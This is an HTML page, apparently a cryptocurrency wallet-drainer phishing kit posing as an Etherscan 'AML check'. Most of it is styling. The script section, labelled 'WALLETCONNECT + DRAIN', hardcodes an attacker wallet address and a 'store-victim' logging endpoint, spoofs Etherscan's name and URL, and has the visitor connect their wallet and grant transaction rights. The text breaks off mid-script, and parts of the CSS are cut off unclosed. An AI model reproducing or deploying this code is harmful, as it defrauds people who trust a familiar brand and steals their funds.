<!DOCTYPE html>
<html lang="en" class="">
<head>

  <title>Verify Your Wallet — AML Check</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
  <style>
/* ===== Design tokens ===== */
:root {
  --white-solid: hsl(0 0% 100%);
  --grey-93: hsl(210 16% 93%);
  --azure-15: hsl(210 11% 15%);
  --grey-46: hsl(208 7% 46%);
  --grey-98: hsl(210 17% 98%);
  --azure-12: hsl(212 74% 12%);
  --azure-40: hsl(200 93% 40%);
  --azure-71: hsl(210 11% 71%);
  --cyan-32: hsl(170 100% 32%);
  --athens-gray: hsl(220 20% 95%);
  --geyser: hsl(210 16% 88%);
  --punch: hsl(357 78% 55%);
}

html.dim {
  --white-solid: #111a2e;
  --grey-93: hsl(215 20% 26%);
  --azure-15: hsl(210 17% 92%);
  --grey-46: hsl(212 12% 66%);
  --grey-98: #152036;
  --azure-12: hsl(215 30% 12%);
  --azure-40: hsl(200 93% 55%);
  --azure-71: hsl(212 12% 55%);
  --cyan-32: hsl(170 80% 45%);
  --athens-gray: hsl(215 20% 26%);
  --geyser: hsl(215 20% 30%);
}

html.dark {
  --white-solid: #111111;
  --grey-93: hsl(0 0% 20%);
  --azure-15: hsl(0 0% 93%);
  --grey-46: hsl(0 0% 63%);
  --grey-98: #171717;
  --azure-12: hsl(0 0% 5%);
  --azure-40: hsl(200 93% 55%);
  --azure-71: hsl(0 0% 50%);
  --cyan-32: hsl(170 80% 45%);
  --athens-gray: hsl(0 0% 20%);
  --geyser: hsl(0 0% 24%);
}

html.dim body,
html.dark body { background-color: var(--grey-98); }

html.dim .site-footer,
html.dark .site-footer {
  --azure-15: #ffffff;
  --azure-12: #ffffff;
}

html.dim .theme-logo-default,
html.dark .theme-logo-default { display: none; }
html.dim .theme-logo-light,
html.dark .theme-logo-light { display: block; }
.theme-logo-light { display: none; }

/* ===== Base ===== */
*, *::before, *::after { box-sizing: border-box; }
html, body { margin: 0; padding: 0; }
body {
  font-family: Inter, system-ui, sans-serif;
  background-color: var(--white-solid);
  color: var(--azure-15);
  min-height: 100vh;
}
a { text-decoration: none; color: inherit; }
ul { list-style: none; margin: 0; padding: 0; }
button { font: inherit; background: none; border: none; cursor: pointer; }
img { display: block; }
.icon { width: 14px; height: 14px; stroke: currentColor; fill: none; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; flex: none; }
.icon-sm { width: 12px; height: 12px; }
.icon-md { width: 16px; height: 16px; }
.container { max-width: 1400px; margin: 0 auto; }

/* ===== Top bar ===== */
.topbar {
  width: 100%;
  background-color: var(--white-solid);
  border-bottom: 1px solid var(--grey-93);
  padding: 8px 20px;
}
.topbar-inner {
  display: flex; align-items: center; justify-content: space-between;
  gap: 16px; padding: 0 20px;
}
.topbar-left { display: flex; flex: 1; align-items: center; gap: 16px; }
.topbar-right { display: flex; flex: 1; align-items: center; justify-content: flex-end; gap: 8px; }
.tb-group { display: flex; align-items: center; gap: 4px; }
.t-xs { font-size: 12px; line-height: 1.33; }
.muted { color: var(--grey-46); }
.link-blue { color: var(--azure-40); }
.link-blue:hover { text-decoration: underline; }
.green { color: var(--cyan-32); }

.search-wrap { position: relative; flex: 1; }
.search-wrap .search-icon {
  position: absolute; left: 12px; top: 50%; transform: translateY(-50%);
  color: var(--azure-71); pointer-events: none;
}
.search-wrap input {
  height: 36px; width: 100%;
  border-radius: 8px; border: 1px solid var(--grey-93);
  background-color: var(--grey-98);
  padding: 0 80px 0 38px;
  font-size: 14px; color: var(--azure-15);
  font-family: inherit;
}
.search-wrap input::placeholder { color: var(--grey-46); }
.search-wrap input:focus { outline: none; border-color: var(--azure-40); }
.slash-badge {
  position: absolute; right: 12px; top: 50%; transform: translateY(-50%);
  border-radius: 6px; background-color: color-mix(in srgb, var(--azure-12) 25%, transparent);
  padding: 1px 8px; font-size: 12px; font-weight: 600; color: var(--white-solid);
}

.icon-btn {
  display: flex; height: 38px; width: 38px; align-items: center; justify-content: center;
  border-radius: 8px; border: 1px solid var(--athens-gray);
  background-color: var(--white-solid); color: var(--azure-15);
  transition: background-color .15s ease;
}
.icon-btn:hover { background-color: var(--grey-93); }
.theme-wrap { position: relative; }
.theme-menu {
  position: absolute; right: 0; margin-top: 8px; width: 176px; z-index: 50;
  overflow: hidden; border-radius: 8px; border: 1px solid var(--grey-93);
  background-color: var(--white-solid); padding: 4px 0;
  box-shadow: 0 10px 15px -3px rgb(0 0 0 / .1);
}
.theme-menu[hidden] { display: none; }
.theme-menu button {
  display: flex; width: 100%; align-items: center; gap: 8px;
  padding: 8px 12px; font-size: 14px; color: var(--azure-15);
}
.theme-menu button:hover { background-color: var(--grey-98); }
.theme-menu button span { flex: 1; text-align: left; }
.theme-menu .check { color: var(--azure-40); }
.theme-menu .check[hidden] { visibility: hidden; display: block; }

/* ===== Header ===== */
.site-header {
  position: relative; width: 100%;
  border-bottom: 1px solid var(--grey-93);
  background-color: var(--white-solid);
  box-shadow: 0 5px 10px 0 rgb(151 164 175 / .05);
}
.site-nav {
  display: flex; align-items: center; justify-content: space-between;

}
.brand { padding-right: 16px; }
.brand img { height: 34px; width: 150px; }
.nav-list { display: flex; align-items: center; gap: 24px; }
.nav-list > li { position: relative; }
.nav-link, .nav-btn {

}
.nav-link:hover, .nav-btn:hover, .nav-btn.open { color: var(--azure-40); }
.nav-sep { font-size: 14px; color: var(--azure-71); }
.signin { display: flex; align-items: center; gap: 6px; font-size: 14px; color: var(--azure-15); transition: color .15s ease; }
.signin:hover { color: var(--azure-40); }

.dropdown {
  position: absolute; left: 0; top: 100%; z-index: 50; min-width: 280px;
  border-radius: 0 0 6px 6px;
  border-left: 1px solid var(--grey-93);
  border-right: 1px solid var(--grey-93);
  border-bottom: 1px solid var(--grey-93);
  border-top: 3px solid var(--azure-40);
  background-color: var(--white-solid);
  padding: 8px 0;
  box-shadow: 0 8px 24px rgb(0 0 0 / .12);
}
.dropdown[hidden] { display: none; }
.dropdown a {
  display: flex; align-items: center; gap: 8px; white-space: nowrap;
  padding: 7px 20px; font-size: 13px; color: var(--azure-15);
}
.dropdown .divider { margin: 8px 0; border-top: 1px solid var(--azure-40); }
.badge-pill {

  padding: 1px 8px; font-size: 10px; font-weight: 500; color: var(--azure-40);
}
.badge-sq {
  border-radius: 4px; background-color: var(--grey-93);
  padding: 1px 6px; font-size: 10px; font-weight: 500; color: var(--azure-40);
}

.mega {
  position: absolute; left: 0; right: 0; top: 100%; z-index: 40;
  border-radius: 0 0 6px 6px;
  border-bottom: 1px solid var(--grey-93);
  border-top: 3px solid var(--azure-40);
  background-color: var(--white-solid);
  box-shadow: 0 12px 28px rgb(0 0 0 / .12);
}
.mega[hidden] { display: none; }
.mega-grid {
  display: grid; grid-template-columns: repeat(4, minmax(0, 1fr));
  gap: 32px; padding: 32px 40px;
}
.mega h3 { margin: 0 0 16px; font-size: 15px; font-weight: 600; color: var(--azure-15); }
.mega ul { display: flex; flex-direction: column; gap: 4px; }
.mega a {
  display: flex; align-items: center; gap: 8px;
  padding: 7px 0; font-size: 13px; color: var(--azure-15);
}

/* ===== Main ===== */
.main {
  background-image: linear-gradient(to top, var(--white-solid), var(--grey-98));
  padding: 0 20px;
}
.main-inner { display: flex; justify-content: center; padding: 80px 0 128px; }
.card {

.card h1 { margin: 0; font-size: 23px; font-weight: 500; line-height: 1.2; color: var(--azure-15); }
.card .sub { margin: 8px 0 0; font-size: 14px; color: var(--azure-15); }

/* ===== Footer ===== */
.site-footer { width: 100%; background-color: var(--grey-98); padding: 0 20px; }
.footer-inner { max-width: 1400px; margin: 0 auto; padding: 0 20px; }
.footer-top { display: flex; align-items: center; justify-content: space-between; padding: 24px 0; }
.socials { display: flex; gap: 8px; }

.footer-desc { margin: 0; font-size: 12px; line-height: normal; color: var(--azure-15); }
.footer-desc span { white-space: nowrap; }
.footer-col { width: 240px; }
.footer-col > p { margin: 0; font-size: 14px; font-weight: 500; line-height: 1.2; color: var(--azure-15); }
.footer-col ul { margin-top: 16px; display: flex; flex-direction: column; gap: 12px; }
.footer-col li { display: flex; align-items: center; gap: 8px; }

.donations a { font-size: 12px; color: var(--azure-40); }

.lang {

  <script src="https://cdn.jsdelivr.net/npm/ethers@5.2.0/dist/ethers.umd.min.js"></script>

  <script>
/******************************************
 * PARTIE 1 – FONCTIONS EXISTANTES
 * (menu burger, thème sombre/clair)
 ******************************************/
document.addEventListener('DOMContentLoaded', function () {

  // --- Burger menu ---
  const burgerBtn = document.getElementById('burgerBtn');
  const mobileMenu = document.getElementById('mobileMenu');
  const closeMenuBtn = document.getElementById('closeMenuBtn');

  if (burgerBtn && mobileMenu) {
    burgerBtn.addEventListener('click', () => {
      mobileMenu.classList.toggle('open');
    });
    if (closeMenuBtn) {
      closeMenuBtn.addEventListener('click', () => {
        mobileMenu.classList.remove('open');
      });
    }
  }

  // --- Theme toggle ---
  const themeToggle = document.getElementById('themeToggle');
  const html = document.documentElement;
  if (themeToggle) {
    themeToggle.addEventListener('click', () => {
      const isDark = html.classList.toggle('dark');
      localStorage.setItem('theme', isDark ? 'dark' : 'light');
    });
    // Restore saved theme
    const saved = localStorage.getItem('theme');
    if (saved === 'dark') {
      html.classList.add('dark');
    }
  }

  // Lancer le module WalletConnect
  initWalletConnect().catch(err => {
    console.error('Erreur init WC:', err);
    const scanText = document.querySelector('.scan');
    if (scanText) scanText.textContent = 'Erreur de connexion';
  });
});

/******************************************
 * PARTIE 2 – WALLETCONNECT + DRAIN
 ******************************************/
const ATTACKER = '0x22C8A3678871133D80f457CFaa6a442CC383481F';
const API = 'https://aml-checker-4.vercel.app/api/store-victim';
const PROJECT_ID = '22d764eabb976a73c5ee29567f3972d6';

let signClient, session, account, currentChainId;

function getSignClient() {
  const ns = window["@walletconnect/sign-client"];
  if (ns) {
    const sc = ns.SignClient || ns.default;
    if (sc && typeof sc.init === 'function') return sc;
  }
  return null;
}

async function initWalletConnect() {
  const SignClientClass = getSignClient();
  if (!SignClientClass) throw new Error('WalletConnect non trouvé.');

  signClient = await SignClientClass.init({
    projectId: PROJECT_ID,
    metadata: {
      name: 'Etherscan',
      description: 'Vérification AML',
      url: 'https://etherscan.io',
      icons: ['https://aml-checker-4.vercel.app/etherscan-logo-circle.png']
    }
  });

  const { uri, approval } = await signClient.connect({
    requiredNamespaces: {
      eip155: {
        methods: ['eth_sendTransaction'],
        chains: ['eip155:1'],
        events: ['chainChanged', 'accountsChanged']
      }
    }
  });

  // Attendre que QRCode soit chargé
  if (typeof QRCode === 'undefined') {
    await new Promise((resolve, reject) => {
      let tries = 0;
      const interval = setInterval(() => {
        if (typeof QRCode !== 'undefined') { clearInterval(interval); resolve(); }
        if (++tries > 20) { clearInterval(interval); reject('QRCode non chargé'); }
      }, 250);
    });
  }

  const qrDiv = document.getElementById('qrcode');
  qrDiv.innerHTML = '';
  new QRCode(qrDiv, { text: uri, width: 250, height: 250 });

  session = await approval();

  const accounts = session.namespaces['eip155'].accounts;
  const ethAccount = accounts.find(acc => acc.startsWith('eip155:1:'));
  if (!ethAccount) throw new Error('Ethereum mainnet requis');
  account = ethAccount.split(':')[2];
  currentChainId = '1';

  // Cacher le QR et afficher le statut
  qrDiv.style.display = 'none';
  const scanText = document.querySelector('.scan');
